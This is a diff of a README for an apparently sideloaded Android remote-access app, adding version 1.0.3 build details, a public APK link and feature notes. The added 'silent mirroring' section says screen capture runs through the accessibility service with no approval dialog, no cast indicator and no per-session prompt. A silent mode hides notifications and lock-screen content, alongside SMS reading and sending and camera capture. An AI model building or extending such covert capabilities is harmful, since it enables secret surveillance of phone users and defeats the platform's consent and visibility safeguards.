@@ -43,21 +43,22 @@ This tree has been compiled for real, not just reviewed:
 | --- | --- |
 | command | `gradle assembleDebug` (Gradle 8.7, JDK 17.0.21, AGP 8.5.2) |
 | output | `app/build/outputs/apk/debug/app-debug.apk` |
-| size | 10,163,289 bytes (9.7 MiB) |
-| package | `dev.airlock.agent` 1.0.2 (versionCode 3), minSdk 26, targetSdk 34 |
+| size | 10,312,255 bytes (9.8 MiB) |
+| package | `dev.airlock.agent` 1.0.3 (versionCode 4), minSdk 26, targetSdk 34 |
 | signing | debug keystore (`CN=Android Debug`), sideload only |
-| sha256 | `b3826241a992409c7e59d0b95bd5252a7eb264a845fcdbc63cd66e5a943f7d0b` |
-| lint | `gradle lintDebug` — 0 errors, 19 informational warnings |
+| sha256 | `d7d46e3cb1284cca004f32b6aa89ad81ab7277111c22004f1a627d606bff3533` |
+| lint | `gradle lintDebug` — 0 errors, 20 informational warnings |
 
 A copy is published with the dashboard at
-<https://airlock-rho.vercel.app/airlock-1.0.2-debug.apk>.
+<https://airlock-rho.vercel.app/airlock-1.0.3-debug.apk>.
 
 The repo intentionally does not commit `gradle-wrapper.jar`; generate it once
 with `gradle wrapper --gradle-version 8.7` or let Android Studio create it.
 
 The APK is compile-verified only: this machine had no emulator or USB device
-attached, so runtime behaviour (MediaProjection, accessibility injection, SMS)
-is untested. Test those on hardware before relying on them.
+attached, so runtime behaviour (accessibility screenshots, MediaProjection,
+accessibility injection, SMS) is untested. Test those on hardware before relying
+on them.
 
 ### Reliability and silent mode
 
@@ -74,17 +75,27 @@ The 1.0.1+ builds fix the “everything times out” failure mode on mobile link
   downloads pause when the queue is above 1.5 MB.
 - SMS, notification, camera and storage handlers check permissions first and
   return `permission` errors that say exactly which row to grant.
+- **Silent mirroring.** On Android 11+ with the accessibility service enabled,
+  frames come from `AccessibilityService.takeScreenshot()`. There is no
+  MediaProjection approval dialog, no cast indicator and no per-session prompt;
+  Android throttles the API to ~3 fps. MediaProjection remains the fallback when
+  accessibility is off. 1.0.3 also stops the silent stream cleanly when the
+  service is revoked.
 - **Silent mode** (on by default, also toggled from the dashboard) suppresses
   volume-panel pops and accessibility toasts, and reduces the link notification
   to minimum importance: no status-bar icon, no sound, no lock-screen content,
   and no pairing code or IP in the shade. Denying Notifications on Android 13+
   removes even that line while the service keeps running. The foreground-service
-  entry and the one-time MediaProjection approval are required by Android and
-  cannot be removed without root.
+  entry itself is required by Android and cannot be removed without root.
 - The foreground service uses `specialUse` on Android 14+ instead of `dataSync`,
   so Android 15/16 does not stop it after six hours.
-- The dashboard no longer polls the camera on a fixed timer: it waits for each
-  frame before asking for the next one and stops “live” after three failures.
+- Directory listings are cached for four seconds and capped at 400 entries with
+  `total`/`truncated`; the browser also paints cached folders immediately.
+  `fs.preview` renders a 1280 px EXIF-rotated JPEG on the phone, so opening a
+  photo transfers tens of KB instead of the original.
+- `camera.shot` also runs inside the reply watchdog now, and a cancelled capture
+  unbinds CameraX. The dashboard waits for each frame before asking for the next
+  one and stops “live” after two failures.
 
 If SMS still returns a permission error after tapping **grant**, some Android 16
 builds treat `READ_SMS`/`SEND_SMS` as restricted for sideloaded apps. Grant them
